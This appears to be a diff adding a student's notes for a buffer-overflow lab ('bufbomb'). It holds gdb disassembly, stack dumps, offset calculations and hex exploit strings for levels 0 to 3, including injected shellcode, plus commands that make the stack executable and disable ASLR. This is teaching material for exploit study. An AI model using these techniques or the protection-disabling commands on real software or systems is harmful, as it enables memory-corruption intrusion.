@@ -1,0 +1,166 @@
+level 0:
+
+(gdb) disas test
+Dump of assembler code for function test:
+   0x08049000 <+0>:	push   %ebp
+   0x08049001 <+1>:	mov    %esp,%ebp
+   0x08049003 <+3>:	sub    $0x18,%esp
+   0x08049006 <+6>:	movl   $0xdeadbeef,-0x4(%ebp)
+   0x0804900d <+13>:	movl   $0x3,(%esp)
+   0x08049014 <+20>:	call   0x80489a0 <entry_check>
+=> 0x08049019 <+25>:	call   0x8048fe0 <getbuf>
+   0x0804901e <+30>:	mov    %eax,%edx
+   0x08049020 <+32>:	mov    -0x4(%ebp),%eax
+   0x08049023 <+35>:	cmp    $0xdeadbeef,%eax
+   0x08049028 <+40>:	je     0x8049038 <test+56>
+   0x0804902a <+42>:	movl   $0x80498b8,(%esp)
+   0x08049031 <+49>:	call   0x8048714 <puts@plt>
+   0x08049036 <+54>:	leave  
+   0x08049037 <+55>:	ret    
+   0x08049038 <+56>:	cmp    0x804a1cc,%edx
+   0x0804903e <+62>:	je     0x8049052 <test+82>
+   0x08049040 <+64>:	mov    %edx,0x4(%esp)
+   0x08049044 <+68>:	movl   $0x8049a9b,(%esp)
+   0x0804904b <+75>:	call   0x8048764 <printf@plt>
+   0x08049050 <+80>:	leave  
+   0x08049051 <+81>:	ret    
+   0x08049052 <+82>:	mov    %edx,0x4(%esp)
+   0x08049056 <+86>:	movl   $0x8049a7e,(%esp)
+   0x0804905d <+93>:	call   0x8048764 <printf@plt>
+   0x08049062 <+98>:	movl   $0x3,(%esp)
+   0x08049069 <+105>:	call   0x8048ae0 <validate>
+   0x0804906e <+110>:	leave  
+   0x0804906f <+111>:	ret    
+End of assembler dump.
+(gdb) si
+0x08048fe0 in getbuf ()
+(gdb) x/xw $esp
+0xffffb17c:	0x0804901e
+
+A=0xffffb17c
+
+B=0xffffb16c
+
+OFFSET=A-B=16
+
+&smoke = 0x08048e20
+
+exploit:
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20 8e 04 08
+
+level1:
+cookie: 0x76db18e9
+
+&fizz = 0x08048dc0
+
+(gdb) x/32x $esp-32
+0xffffb15c:	0x08048ff1	0xffffb16c	0xf7da34ec	0x00000000
+0xffffb16c:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffb17c:	0x08048dc0	0x00000000	0x08049ac7	0xffffb1a4
+0xffffb18c:	0x00000000	0xf7ee9be6	0xdeadbeef	0xffffcb78
+0xffffb19c:	0x08049105	0x08049ac7	0x000000f4	0x00001968
+0xffffb1ac:	0x00000000	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
+0xffffb1bc:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
+0xffffb1cc:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
+
+(gdb) disas fizz
+Dump of assembler code for function fizz:
+   0x08048dc0 <+0>:	push   %ebp
+   0x08048dc1 <+1>:	mov    %esp,%ebp
+   0x08048dc3 <+3>:	push   %ebx
+   0x08048dc4 <+4>:	sub    $0x14,%esp
+   0x08048dc7 <+7>:	mov    0x8(%ebp),%ebx
+=> 0x08048dca <+10>:	movl   $0x1,(%esp)
+   0x08048dd1 <+17>:	call   0x80489a0 <entry_check>
+   0x08048dd6 <+22>:	cmp    0x804a1cc,%ebx
+   0x08048ddc <+28>:	je     0x8048e00 <fizz+64>
+   0x08048dde <+30>:	mov    %ebx,0x4(%esp)
+   0x08048de2 <+34>:	movl   $0x8049898,(%esp)
+   0x08048de9 <+41>:	call   0x8048764 <printf@plt>
+   0x08048dee <+46>:	movl   $0x0,(%esp)
+   0x08048df5 <+53>:	call   0x80487a4 <exit@plt>
+   0x08048dfa <+58>:	lea    0x0(%esi),%esi
+   0x08048e00 <+64>:	mov    %ebx,0x4(%esp)
+   0x08048e04 <+68>:	movl   $0x8049a29,(%esp)
+   0x08048e0b <+75>:	call   0x8048764 <printf@plt>
+   0x08048e10 <+80>:	movl   $0x1,(%esp)
+   0x08048e17 <+87>:	call   0x8048ae0 <validate>
+   0x08048e1c <+92>:	jmp    0x8048dee <fizz+46>
+End of assembler dump.
+(gdb) p $ebx
+$2 = 134519495
+(gdb) p/x $ebx
+$3 = 0x8049ac7
+(gdb) c
+Continuing.
+Type string:Misfire: You called fizz(0x8049ac7)
+[Inferior 1 (process 132319) exited normally]
+
+expliot:
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 8d 04 08 00 00 00 00 e9 18 db 76
+
+level2:
+level2 and level3 need open execstack and disable randomize stack
+##########################
+$ execstack -s bufbomb
+$ sudo sysctl -w kernel.randomize_va_space=0
+##########################
+
+&global_val = 0x0804a1dc
+&bang = 0x08048d60
+B = 0xffffb16c
+
+   0:	b8 dc a1 04 08       	mov    $0x804a1dc,%eax
+   5:	c7 00 e9 18 db 76    	movl   $0x76db18e9,(%eax)
+   b:	eb 07                	jmp    0x14
+   d:	90                   	nop
+   e:	90                   	nop
+   f:	90                   	nop
+  10:	6c                   	insb   (%dx),%es:(%edi)
+  11:	71 ff                	jno    0x12
+  13:	ff                   	(bad)  
+  14:	bb 60 8d 04 08       	mov    $0x8048d60,%ebx
+  19:	ff e3                	jmp    *%ebx
+
+
+expliot:
+b8 dc a1 04 08 c7 00 e9 18 db 76 eb 07 90 90 90 6c b1 ff ff bb 60 8d 04 08 ff e3
+
+level3:
+原本的返回值：0x0804901e
+不能破坏栈中的%ebp的值
+
+   0x08048fe0 <+0>:	push   %ebp
+   0x08048fe1 <+1>:	mov    %esp,%ebp
+   0x08048fe3 <+3>:	sub    $0x18,%esp
+   0x08048fe6 <+6>:	lea    -0xc(%ebp),%eax
+   0x08048fe9 <+9>:	mov    %eax,(%esp)
+=> 0x08048fec <+12>:	call   0x8048e60 <Gets>
+   0x08048ff1 <+17>:	mov    $0x1,%eax
+   0x08048ff6 <+22>:	leave  
+   0x08048ff7 <+23>:	ret    
+
+
+(gdb) x/8xw 0xffffb16c
+0xffffb16c:	0x00000000	0x00000004	0x0804b580	0xffffb198 <- this value
+0xffffb17c:	0x0804901e	0x00000003	0x08049ac7	0xffffb1a4
+
+
+expliot:
+b8 e9 18 db 76 be 1e 90 04 08 ff e6 98 b1 ff ff 6c b1 ff ff
+
+   0x08048fe0 <+0>:	push   %ebp
+   0x08048fe1 <+1>:	mov    %esp,%ebp
+   0x08048fe3 <+3>:	sub    $0x18,%esp
+   0x08048fe6 <+6>:	lea    -0xc(%ebp),%eax
+   0x08048fe9 <+9>:	mov    %eax,(%esp)
+   0x08048fec <+12>:	call   0x8048e60 <Gets>
+   0x08048ff1 <+17>:	mov    $0x1,%eax
+   0x08048ff6 <+22>:	leave  
+=> 0x08048ff7 <+23>:	ret 
+
+(gdb) x/8xw 0xffffb16c
+0xffffb16c:	0xdb18e9b8	0x901ebe76	0xe6ff0804	0xffffb198 <- no change
+0xffffb17c:	0xffffb16c	0x00000000	0x08049ac7	0xffffb1a4
+
+
